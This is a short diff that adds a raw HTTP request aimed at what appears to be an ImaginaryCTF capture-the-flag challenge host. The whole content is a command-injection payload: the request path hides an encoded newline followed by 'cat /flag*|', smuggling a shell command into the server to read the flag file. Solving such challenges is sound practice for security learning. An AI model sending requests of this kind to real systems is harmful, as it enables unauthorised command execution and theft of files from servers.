@@ -1,0 +1,4 @@
+GET /x%0Acat%20/flag*%7C HTTP/1.1
+Host: pearl.chal.imaginaryctf.org
+Connection: keep-alive
+
